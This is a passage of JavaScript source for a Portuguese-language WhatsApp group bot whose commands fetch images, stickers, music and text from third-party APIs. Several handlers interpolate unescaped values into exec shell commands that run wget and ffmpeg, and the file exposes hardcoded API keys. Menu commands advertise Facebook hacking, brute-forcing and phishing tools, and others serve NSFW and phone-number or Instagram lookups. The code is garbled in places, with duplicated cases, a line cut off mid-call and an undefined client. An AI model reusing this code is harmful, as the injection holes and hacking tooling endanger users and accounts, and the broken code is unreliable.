						reply('Desativar grupo anti-link com sucesso neste grupo ✔️')
					} else {
						reply('1 para ativar, 0 para desativar ')
					}
					break
					case 'antifake':
					try {
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						if (isAntiFake) return reply('Ja esta ativo')
						antifake.push(from)
						fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))
						reply('Ativou com sucesso o recurso de antifake neste grupo✔️')
					} else if (Number(args[0]) === 0) {
						antifake.splice(from, 1)
						fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))
						reply('Desativou com sucesso o recurso de antifake neste grupo✔️')
					} else {
						reply('1 para ativar, 0 para desativar')
					}
					} catch {
						reply('Deu erro, tente novamente :/')
					}
                break
				case 'cgame':

					reply(mess.wait)
					buff = await getBuffer(`https://api.vhtear.com/gamelogo?text=${body.slice(7)}&apikey=${VthearApi}`, {method: 'get'})
					client.sendMessage(from, buff, image, {caption: 'Aqui amigo (a)', quoted: mek})
					await limitAdd(sender) 
					break 
				case 'cparty':

					part = `${body.slice(8)}`
					reply(mess.wait)
					bufferu = await getBuffer(`https://api.vhtear.com/partytext?text=${part}&apikey=${VthearApi}`, {method: 'get'})
					client.sendMessage(from, bufferu, image, {caption: 'Aqui amigo (a)', quoted: mek})
					await limitAdd(sender) 
					break 
				case 'cstyle':

					reply(mess.wait)
					buff = await getBuffer(`https://api.vhtear.com/stylelogo?text=${body.slice(8)}&apikey=${VthearApi}`, {method: 'get'})
					client.sendMessage(from, buff, image, {caption: 'Aqui amigo (a)', quoted: mek})
					await limitAdd(sender) 
					break 
				case 'cglass':

					glass = `${body.slice(8)}`
					reply(mess.wait)
					bufferu = await getBuffer(`https://api.vhtear.com/wetglass?text=${glass}&apikey=${VthearApi}`, {method: 'get'})
					client.sendMessage(from, bufferu, image, {caption: 'Aqui amigo (a)', quoted: mek})
					await limitAdd(sender) 
					break 
					case 'croman':               
                roman = `${body.slice(8)}`
                     if (args.length < 1) return reply('Cadê o texto, mano??')
                     if (args.length > 10) return reply('pelo menos 10 caracteres')
                     buff = await getBuffer(`https://api.vhtear.com/romancetext?text=${roman}&apikey=${VthearApi}`, {method: 'get'})
                     client.sendMessage(from, buff, image, {quoted: mek})
                  await limitAdd(sender) 
                  break 
				case 'setnomebot':
					if (args.length < 1) return
					if (!isOwner) return reply(mess.only.ownerB)
					name = body.slice(12)
					reply(`O nome do bot foi alterado com sucesso para : ${name}`)
					break
					case 'clove':
					  if (args.length < 1) return reply('Cadê o texto, mano??')
                     if (args.length > 10) return reply('pelo menos 10 caracteres')
					 love = `${body.slice(7)}`
					 buff = await getBuffer(`https://api.vhtear.com/lovemessagetext?text=${love}&apikey=${VthearApi}`, {method: 'get'})
					 client.sendMessage(from, buff, image, {quoted: mek})
					 await limitAdd(sender)
					 break 
			    case 'lovemake':
              	    if (args.length < 1) return reply('Onde está o texto, irmão??')
                    teks = `${body.slice(8)}`
                    if (teks.length > 10) return client.sendMessage(from, 'Teksnya kepanjangan, Maksimal 10 kalimat', text, {quoted: mek})
                    buff = await getBuffer(`https://api.vhtear.com/lovemessagetext?text=${teks}&apikey=ANTIGRATISNIHANJENKKK`, {method: 'get'})
                    client.sendMessage(from, buff, image, {quoted: mek, caption: `${teks}`})
			     	break
                	case 'tomp3':
                	client.updatePresence(from, Presence.composing) 
					if (!isQuotedVideo) return reply('Marque o video pfv')
					reply(mess.wait)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('❌ Falha ao converter vídeo para mp3 ❌')
						buffer = fs.readFileSync(ran)
						client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek})
						fs.unlinkSync(ran)
					})
					break
				case 'boquet':
				client.updatePresence(from, Presence.composing) 
				 data = fs.readFileSync('./Fxc7/18.js');
                 jsonData = JSON.parse(data);
                 randIndex = jsonData[Math.floor(Math.random() * (jsonData.length))];
                 randKey = jsonData[randIndex];
                 randBokep = await getBuffer(randKey.image)
                 reply(mess.wait)
                 randTeks = await fetchJson(randKey.teks)
                 client.sendMessage(from, randBokep, image, {quoted: mek, caption: randTeks})
				await limitAdd(sender) 
				break

			    case 'shorturl':
                    anu = await fetchJson(`https://tobz-api.herokuapp.com/api/shorturl?url=${body.slice(10)}`)
			        hasil = `${anu.result}`
			        reply(hasil)
			        break
			    case 'infonomor':
                    anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/infonomor?no=${body.slice(10)}`)
			        hasil = `*número* \n${anu.nomor} *internacional* \n${anu.international}`
			        reply(hasil)
			        break
			    case 'igstalk':
					if (args.length < 1) return reply('Masukan username mu!!')
					ige = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api.vhtear.com/igprofile?query=${ige}&apikey=ANTIGRATISNIHANJENKKK`, {method: 'get'})
					buffer = await getBuffer(anu.result.picture)
					capt = `User Ditemukan!!\n\n*➸ Nama :* ${anu.result.full_name}\n*➸ Username :* ${anu.result.username}\n*➸ Followers :* ${anu.result.follower}\n*➸ Mengikuti :* ${anu.result.follow}\n*➸ Jumlah Post :* ${anu.result.post_count}\n*➸ Private :* ${anu.result.is_private}\n*➸ Bio :* ${anu.result.biography}`
					client.sendMessage(from, buffer, image, {quoted: mek, caption: capt})
					break
				//lgiproses
				case 'tesss':
					if (args.length < 1) return reply('o que você quer tio')
					teks = body.slice(7)
					if (teks.length > 8) return reply('O texto é longo, com até 8 caracteres')
					reply(mess.wait)
					anu = await fetchJson(`https://zeksapi.herokuapp.com/api/leavest?text=${teks}&apikey=xptnbot352`)
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
                                case 'mining':
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
                                        if (!isEventon) return reply(`maaf ${pushname} event mining tidak di aktifkan oleh owner`)
                                        if (isOwner) {
                                                const one = 999999999
                                                addLevelingXp(sender, one)
                                                addLevelingLevel(sender, 99)
                                                reply(`porque você é nosso proprietário da equipe bot de envio ${one}Xp para voce`)
                                        } else {
                                                const mining = Math.ceil(Math.random() * 10000)
                                                addLevelingXp(sender, mining)
                                                await reply(`*Parabéns* ${pushname} você pega *${mining}Xp*`)
                                        }
                                        await limitAdd(sender)
                                        break
			    case 'waifu':
				    try {
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/waifu`, {method: 'get'})
						buffer = await getBuffer(res.image)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'ksksksks hmm'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERROR* ❌')
					}
					break
			    case 'waifu2':
					reply(mess.wait)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/waifu`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					buffer = await getBuffer(anu.image)
					waifu = `*${anu.desc}`
					client.sendMessage(from, buffer, image, {quoted: mek, caption: waifu})
					break
				case 'imoji':
					reply(mess.wait)
					anu = await fetchJson(`https://mhankbarbars.herokuapp.com/api/emoji2png?emoji=`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
				case 'wibu':
					reply(mess.wait)
					anu = await fetchJson(`https://api.vhtear.com/randomwibu&apikey=ANTIGRATISNIHANJENKKK`)
					if (anu.error) return reply(anu.error)
					buffer = await getBuffer(anu.result.foto)
					wibu = ` ➸ *nome* ${anu.result.nama} ➸ *descrição* ${anu.result.deskripsi}`
					client.sendMessage(from, buffer, image, {quoted: mek, caption: wibu})
					break
                   case 'map':
                   data = await fetchJson(`https://mnazria.herokuapp.com/api/maps?search=${body.slice(5)}`)
                   hasil = await getBuffer(data.gambar)
                   client.sendMessage(from, hasil, image, {quoted: mek, caption: `Resultados de *${body.slice(5)}*`})
                   await limitAdd(sender)
                   break
                   case 'covidcountry':
                   client.updatePresence(from, Presence.composing) 
                   data = await fetchJson(`https://arugaz.my.id/api/edu/corona?country=${body.slice(7)}`)
                   if (data.result) reply(data.result)
                   hasil = `País : ${data.result.country}\n\nAtivo : ${data.result.active}\ncasesPerOneMillion : ${data.result.casesPerOneMillion}\ncrítico : ${data.result.critical}\nMortes por milhão : ${data.result.deathsPerOneMillion}\nrecuperado : ${data.result.recovered}\nteste por milhão : ${data.result.testPerOneMillion}\ncasos de hj : ${data.result.todayCases}\nMortes de hj : ${data.result.todayDeath}\nCasos total : ${data.result.totalCases}\ntotalTest : ${data.result.totalTest}`
                   reply(hasil)
                   await limitAdd(sender)
                   break
					case 'totaluser':
					if (!isOwner) return reply(mess.only.ownerB)    
					teks = `\`\`\`╭────*「 *TOTAL DE USUÁRIOO OLAF BOT 👑* 」\n\`\`\``
					no = 0
					for (let hehehe of user) {
						no += 1
						teks += `\`\`\`[${no.toString()}]\`\`\` @${hehehe.split('@')[0]}\n`
					}
					teks += `│+ Total de usuários : ${user.length}\n╰──────*「 *OLAF* 」*────`
					 client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": user}})
					break
				case 'desligar':
					if (!isOwner) return reply(mess.only.ownerB)
					loli.getSFWLoli(async (err, res) => {
						if (err) return reply('*ERRO AO DESLIGAR*')
						buffer = await getBuffer(res.url)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'lolizinha'})
					})
					break
			case 'closegc':
					client.updatePresence(from, Presence.composing) 
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					var nomor = mek.participant
					const close = {
					text: `Grupo fechado pelo administrador @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *apenas administrador* quem pode enviar mensagens`,
					contextInfo: { mentionedJid: [nomor] }
					}
					client.groupSettingChange (from, GroupSettingChange.messageSend, true);
					reply(close)
					break
				case 'kurumi':
					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+karumi`, {method: 'get'})
					kur = JSON.parse(JSON.stringify(anu));
					imi =  kur[Math.floor(Math.random() * kur.length)];
					nye = await getBuffer(imi)
					client.sendMessage(from, nye, image, { caption: 'kurumi chan!!', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'miku':
					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+miku`, {method: 'get'})
					mi = JSON.parse(JSON.stringify(anu));
					ku =  mi[Math.floor(Math.random() * mi.length)];
					nye = await getBuffer(ku)
					client.sendMessage(from, nye, image, { caption: 'miku chan!!', quoted: mek })
					await limitAdd(sender) 
					break 
					
// recursos anime, random @olaf domina vida

                case 'anjing':
                   if (!isGroup) return reply(ind.groupo())
                   if (!isNsfw) return reply(ind.nsfwoff())
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anjing`, {method: 'get'})
					reply(mess.wait)
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					client.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
				//jojo 
				case 'stickerhide':
				    ranp = getRandom('.gif')
					rano = getRandom('.webp')
				anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/screed?text=${args[0]}`,{method: 'get'})
				exec(`wget ${anu} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					break
                case 'resepmasakan':
                
                reply(mess.wait)
                   anu = await fetchJson(`https://api.vhtear.com/resepmasakan?query=${body.slice(12)}&apikey=${VthearApi}`, {method: 'get'})
                   buff = await getBuffer(anu.result.image)
                   resep = `*${anu.result.title}*\n${anu.result.desc}\n\n*INGREDIENTES² INDISPENSÁVEL*\n${anu.result.bahan}\n\n*COMO COZINHAR*\n${anu.result.cara}`
                   client.sendMessage(from, buff, image, {quoted: mek, caption: resep})
                   await limitAdd(sender) 
                   break 
               case 'cersex':
                
                   anu = await fetchJson(`https://api.vhtear.com/cerita_sex&apikey=${VthearApi}`, {method: 'get'})
                   if (anu.error) return reply(anu.error)
                   sex = await getBuffer(anu.result.image)
                   reply (mess.wait)
                   cerita = `• *Título:* ${anu.result.judul}\n\n${anu.result.cerita}`
                   client.sendMessage(from, sex, image, {quoted: mek, caption: cerita})
                   await limitAdd(sender) 
                   break 
              case 'cerpen':

                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/cerpen`, {method: 'get'})
                   cerpen = `• *Title:* ${anu.result.title}\n• *Pengarang:* ${anu.result.pengarang}\n• *Kategori:* ${anu.result.kategori}\n\n${anu.result.cerpen}`
                   client.sendMessage(from, cerpen, text, {quoted: mek})
                   break 
               case 'puisiimg':

                   pus = await getBuffer(`https://api.vhtear.com/puisi_image&apikey=${VthearApi}`, {method: 'get'})
                   client.sendMessage(from, pus, image, {quoted: mek})
                   break 
				case 'akira':
					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+akira`, {method: 'get'})
					ak = JSON.parse(JSON.stringify(anu));
					ara =  ak[Math.floor(Math.random() * ak.length)];
					nye = await getBuffer(ara)
					client.sendMessage(from, nye, image, { caption: 'akira chan!!', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'itori':
					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+itori`, {method: 'get'})
					it = JSON.parse(JSON.stringify(anu));
					ori =  it[Math.floor(Math.random() * it.length)];
					nye = await getBuffer(ori)
					client.sendMessage(from, nye, image, { caption: 'itori chan!!', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'kurumi':
					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+karumi`, {method: 'get'})
					kur = JSON.parse(JSON.stringify(anu));
					imi =  kur[Math.floor(Math.random() * kur.length)];
					nye = await getBuffer(imi)
					client.sendMessage(from, nye, image, { caption: 'kurumi chan!!', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'miku':
					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+miku`, {method: 'get'})
					mi = JSON.parse(JSON.stringify(anu));
					ku =  mi[Math.floor(Math.random() * mi.length)];
					nye = await getBuffer(ku)
					client.sendMessage(from, nye, image, { caption: 'miku chan!!', quoted: mek })
					await limitAdd(sender) 
					break 
                case 'opengc':
                case 'bukagc':
					client.updatePresence(from, Presence.composing) 
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					open = {
					text: `Grupo aberto pelo administrador @${sender.split("@")[0]}\nsekarang *todos os participantes* pode enviar mensagens`,
					contextInfo: { mentionedJid: [sender] }
					}
					client.groupSettingChange (from, GroupSettingChange.messageSend, false)
					client.sendMessa
				case 'setppbot':
				client.updatePresence(from, Presence.composing) 
				if (!isQuotedImage) return reply(`Envie fotos com legendas ${prefix}setbotpp ou tags de imagem que já foram enviadas`)
					if (!isOwner) return reply(mess.only.ownerB)
					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(enmedia)
					await client.updateProfilePicture(botNumber, media)
					reply('Obrigado pelo novo perfil😗')
					break
				case 'filme':
				if (args.length < 1) return reply('Que filme quer encontrar?')
				reply(mess.wait)
				anu = await fetchJson(`https://api.vhtear.com/downloadfilm?judul=${body.slice(6)}&apikey=${VthearApi}`, {method: 'get'})
				if (anu.error) return reply(anu.error)
				film = `• Título: *${anu.result.judul}*\n• Resolução: *${anu.result.data.resolusi}*\n• Link Download: *${anu.result.data.urlDownload}*\n`
				client.sendMessage(from, film, text, {quoted: mek})
				await limitAdd(sender) 
					break					
				case 'randomcat':
					reply(mess.wait)
					anu = await fetchJson(`https://api.vhtear.com/randomcat?apikey=ANTIGRATISNIHANJENKKK`)
					if (anu.error) return reply(anu.error)
					buffer = await getBuffer(anu.result.url)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
				case 'mlherolist':
					reply(mess.wait)
					anu = await fetchJson(`https://api.vhtear.com/mlherolist?apikey=ANTIGRATISNIHANJENKKK`)
					icon = await getBuffer(anu.icon)
					client.sendMessage(from, icon, image, {quoted: mek})
					break
			    case 'randomanime':
				    try {
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/randomanime`, {method: 'get'})
						buffer = await getBuffer(res.result)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'ni randomanime!'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERROR* ❌')
					}
					break
			    case 'randomhentai':
				    try {
						if (!isNsfw) return reply('❌ *FALSE* ❌')
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/hentai`, {method: 'get'})
						buffer = await getBuffer(res.result)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'hentai teros'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERROR* ❌')
					}
					break
					
			case 'hentai':
				    try {
				    if (!isNsfw) return reply(ind.nsfwoff())
						if (!isNsfw) return reply(' *FALSE* ')
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/hentai?apikey=${TobzKey}`, {method: 'get'})
						buffer = await getBuffer(res.result)
						dappa.sendMessage(from, buffer, image, {quoted: mek, caption: 'ni anjim'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply(' *ERROR* ')
					}
					await limitAdd(sender) 
					break                 
					case 'irii':
			client.sendPtt(from, './lindy/iri2.mp3', id)
			break
                case 'play': 
                if (!isGroup) return reply(ind.groupo())  
				reply(mess.wait)
				play = body.slice(5)
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?q=${play}&apikey=apivinz`)
				if (anu.error) return reply(anu.error)
				infomp3 = `*MUSICA ENCONTRADA!!!*\nTítulo : ${anu.result.title}\nUrl : ${anu.result.source}\nTamanho : ${anu.result.size}\n\n*ESPERE UM POUQUINHO, N SPAME O CHAT⛄❤️*`
				buffer = await getBuffer(anu.result.thumbnail)
				client.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
				lagu = await getBuffer(anu.result.url_audio)
				client.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})
				break
          case 'letrasmsc':
                reply(mess.wait)
			    teks = body.slice(7)
				anu = await fetchJson(`http://scrap.terhambar.com/lirik?word=${teks}`, {method: 'get'})
				reply('Letra da musica '+teks+' é :\n\n'+anu.result.lirik)
				await limitAdd(sender) 
				break
                 case 'dmp3':
                reply(mess.wait)
                dark = body.slice(5)
                anu = await fetchJson(`https://darkzinhoapi2021dark.herokuapp.com/api/yt?&url=${dark}`)
               if (anu.error) return reply(anu.error)
                darkmp3 = `*MUSICA ENCONTRADA!!!*\n\nTítulo: ${anu.titulo}\n\nLink de Download:\n\n${anu.resultado}\n\nTamanho: ${anu.tamanho}\n\nSite: ${anu.scrap}\n\n*Api feita por: ${anu.dono_api}*`
                buffer = await getBuffer(anu.thumb)
                client.sendMessage(from, buffer, image, {quoted: mek, caption: darkmp3})
                await limitAdd(sender)
                break
				case 'setnome':
                   if (!isGroup) return reply(mess.only.group)
			       if (!isGroupAdmins) return reply(mess.only.admin)
			   	   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                   client.groupUpdateSubject(from, `${body.slice(9)}`)
                   client.sendMessage(from, 'Sucesso, alterou o nome do grupo', text, {quoted: mek})
                   break
				case 'galaxtext':
					if (args.length < 1) return reply('o que você quer tio')
					teks = body.slice(12)
					if (teks.length > 8) return reply('O texto é longo, com até 8 caracteres')
					reply(mess.wait)
					buffer = await getBuffer(`https://api.vhtear.com/galaxytext?text=${teks}&apikey=ANTIGRATISNIHANJENKKK`)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
                case 'phlogo':
					var gh = body.slice(10)
					var gbl1 = gh.split("|")[0];
					var gbl2 = gh.split("|")[1];
					if (args.length < 1) return reply('Cadê o texto, hum')
					reply(mess.wait)
					anu = await fetchJson(`https://mhankbarbars.herokuapp.com/api/textpro?theme=pornhub&text1=${gbl1}&text2=${gbl2}`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
				case 'primbonjodoh':
					var gh = body.slice(14)
					var gbl1 = gh.split("|")[0];
					var gbl2 = gh.split("|")[1];
					anu = await fetchJson(`https://api.vhtear.com/primbonjodoh?nama=${gbl1}&pasangan=${gbl2}&apikey=ANTIGRATISNIHANJENKKK`)
					reply(anu.result.hasil)
					break
				case 'ramaljadian':
					var gh = body.slice(10)
					var gbl1 = gh.split("|")[0];
					var gbl2 = gh.split("|")[1];
					var gbl3 = gh.split("|")[2];
					anu = await fetchJson(`https://api.vhtear.com/harijadian?tgl=${gbl1}&bln=${gbl2}&thn=${gbl3}&apikey=ANTIGRATISNIHANJENKKK`)
					reply(anu.result.hasil)
					break
                      case 'gay1': 
                                        var imgbb = require('imgbb-uploader')
                                         if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
                                         reply(mess.wait)
                                         owgi = await  client.downloadAndSaveMediaMessage(ger)
                                         anu = await imgbb("727e7e43f6cda1dfb85d888522fd4ce1", owgi)
                                        teks = `${anu.display_url}`
                                        ranp = getRandom('.png')
                                        rano = getRandom('.webp')
                                        anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
                                         exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                                         if (err) return reply(mess.error.stick)
                                                nobg = fs.readFileSync(rano)
                                                 client.sendMessage(from, nobg, sticker, {quoted: mek})
                                                fs.unlinkSync(rano)
                                        })
                                    
                                             } else {
                                                 reply('Use a foto!')
                                          }
                                             break
				case 'txtoc':
				case 'txtocean':
					if (args.length < 1) return reply('O que você quer escrever??') 
					teks = body.slice(7)
					reply(mess.wait)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/photooxy?theme=message_under_the_grass&text=Tobz&apikey=${TobzApi}`, {method: 'get'})
					buff = await getBuffer(anu.result)
					client.sendMessage(from, buff, image, {quoted: mek, caption: mess.success})
                    await limitAdd(sender)
					break
				case 'testing':
					var gh = body.slice(5)
					var gbl3 = gh.split("|")[0];
					var gbl4 = gh.split("|")[1];
					if (args.length < 1) return reply('Cadê o texto, hum')
					reply(mess.wait)
					anu = await fetchJson(`https://zeksapi.herokuapp.com/api/watercolour?text1=${gbl3}&text2=${gbl4}&apikey=xptnbot352`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
				case 'snowrite':
					var gh = body.slice(10)
					var gbl7 = gh.split("|")[0];
					var gbl8 = gh.split("|")[1];
					if (args.length < 1) return reply('Cadê o texto, hum')
					reply(mess.wait)
					anu = await fetchJson(`https://zeksapi.herokuapp.com/api/snowwrite?text1=${gbl7}&text2=${gbl8}&apikey=xptnbot352`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
				case 'marvelogo':
					var gh = body.slice(9)
					var gbl5 = gh.split("|")[0];
					var gbl6 = gh.split("|")[1];
					if (args.length < 1) return reply('Cadê o texto, hum')
					reply(mess.wait)
					anu = await fetchJson(`https://zeksapi.herokuapp.com/api/marvellogo?text1=${gbl5}&text2=${gbl6}&apikey=xptnbot352`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
				case 'animehug':
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson('https://tobz-api.herokuapp.com/api/hug&apikey=BotWeA', {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(mess.error.stick)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					break
				case 'lovemake':
					if (args.length < 1) return reply('Cadê o texto, hum')
					love = body.slice(10)
					if (love.length > 12) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					buffer = await getBuffer(`https://api.vhtear.com/lovemessagetext?text=${love}&apikey=ANTIGRATISNIHANJENKKK`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: ' '+love})
					break
				case 'thunder':
					if (args.length < 1) return reply('Cadê o texto, hum')
					thun = body.slice(9)
					if (thun.length > 10) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					buffer = await getBuffer(`https://api.vhtear.com/thundertext?text=${thun}&apikey=ANTIGRATISNIHANJENKKK`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: ' '+thun})
					break
                case 'stiltext':
                      if (args.length < 1) return reply('Cadê o texto?')
                      gh = body.slice(11)
                      gl1 = gh.split("|")[0];
                      gl2 = gh.split("|")[1];
                      buff = await getBuffer(`https://api.vhtear.com/silktext?text=${gl1}&text2=${gl2}&apikey=ANTIGRATISNIHANJENKKK`)
                      reply(mess.wait)
                      client.sendMessage(from, buff, image, {quoted: mek, caption: 'thund ni '+gh})
                      break
                case 'teste':
					var gh = body.slice(9)
					coli1 = gh.split("|")[0];
					coli2 = gh.split("|")[1];
					if (args.length < 1) return reply('Cadê o texto?')
					reply(mess.wait)
					buffer = await getBuffer(`https://zeksapi.herokuapp.com/api/watercolour?text1=${coli1}&text2=${coli2}&apikey=xptnbot352`)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
				case 'teste2':
					var gh = body.slice(9)
					coli1 = gh.split("|")[0];
					coli2 = gh.split("|")[1];
					if (args.length < 1) return reply('Cadê o texto?')
					reply(mess.wait)
					party = await getBuffer(`https://api.vhtear.com/partytext?text=${coli1}&text2=${coli2}&apikey=ANTIGRATISNIHANJENKKK`)
					client.sendMessage(from, party, image, {quoted: mek})
					break
                case 'ninjalogo':
                      if (args.length < 1) return reply('Cadê o texto?')
                      gh = body.slice(11)
                      gl1 = gh.split("|")[0];
                      gl2 = gh.split("|")[1];
                      reply(mess.wait)
                      anu = await fetchJson(`https://tobz-api.herokuapp.com/api/textpro?theme=ninjalogo&text1=${gl1}&text2=${gl2}`, {method: 'get'})
                      buff = await getBuffer(anu.result)
                      client.sendMessage(from, buff, image, {quoted: mek})
                      break
                    case 'fbcheker':

                    client.sendMessage(from, fbcheker(prefix), text, { quoted: mek })
                    tod = await getBuffer(`https://i.ibb.co/Lv8QGtQ/ch3-1-svg-compress81.jpg`)
                    client.sendMessage(from, tod, image, { quoted: mek, caption: '▉◣◢▉▉▔▉▉▔▉▉▔▉▉▔▉ ▉◥◤▉▉▂▉▉▂◤▉▂▉▉▂◤ ▉┆┆▉▉┆▉▉▔▉▉┆▉▉▔▉ ▉┆┆▉▉┆▉▉▂▉▉┆▉▉┆▉'})
                    break
                    case 'hackfb':                    
                    client.sendMessage(from, hackfb(prefix), text, { quoted: mek })
                    tod = await getBuffer(`https://i.ibb.co/Lv8QGtQ/ch3-1-svg-compress81.jpg`)
                    client.sendMessage(from, tod, image, { quoted: mek, caption: '▉◣◢▉▉▔▉▉▔▉▉▔▉▉▔▉ ▉◥◤▉▉▂▉▉▂◤▉▂▉▉▂◤ ▉┆┆▉▉┆▉▉▔▉▉┆▉▉▔▉ ▉┆┆▉▉┆▉▉▂▉▉┆▉▉┆▉'})
                    break
                    case 'tool':

                    client.sendMessage(from, tool(prefix), text, { quoted: mek })
                    tod = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVuSbtfXab8BfnyFVg-ex9ti1fNafH7bRp4A&usqp=CAU`)
                    client.sendMessage(from, tod, image, { quoted: mek, caption: '*Olaf domina ✓*'})
                    break
                    case 'animemenu':

                    client.sendMessage(from, animemenu(prefix), text, { quoted: mek })
                    tod = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVuSbtfXab8BfnyFVg-ex9ti1fNafH7bRp4A&usqp=CAU`)
                    client.sendMessage(from, tod, image, { quoted: mek, caption: '*Comandos de anime ✓*'})
                    break
                    case 'bruteforcefb':

                    client.sendMessage(from, bruteforcefb(prefix), text, { quoted: mek })
                    tod = await getBuffer(`https://i.ibb.co/Lv8QGtQ/ch3-1-svg-compress81.jpg`)
                    client.sendMessage(from, tod, image, { quoted: mek, caption: '▉◣◢▉▉▔▉▉▔▉▉▔▉▉▔▉ ▉◥◤▉▉▂▉▉▂◤▉▂▉▉▂◤ ▉┆┆▉▉┆▉▉▔▉▉┆▉▉▔▉ ▉┆┆▉▉┆▉▉▂▉▉┆▉▉┆▉'})
                    break
                    case 'toolsphishing':

                    client.sendMessage(from, toolsphishing(prefix), text, { quoted: mek })
                    tod = await getBuffer(`https://i.ibb.co/Lv8QGtQ/ch3-1-svg-compress81.jpg`)
